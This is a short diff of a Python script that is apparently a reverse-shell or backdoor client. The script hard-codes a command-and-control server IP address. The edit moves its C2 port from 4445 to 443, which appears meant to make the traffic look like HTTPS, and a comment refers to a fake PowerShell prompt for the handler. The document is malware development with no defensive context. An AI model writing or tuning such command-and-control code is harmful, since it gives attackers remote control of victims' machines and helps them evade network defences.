@@ -5,7 +5,7 @@ import os
 import time
 
 HOST = "159.69.125.234"  # C2 IP
-PORT = 4445               # C2 port
+PORT = 443              # C2 port
 #PROMPT = "PS C:\\Temp> "  # Fake prompt so handler knows command is done
 
 def handle_output(proc, sock):
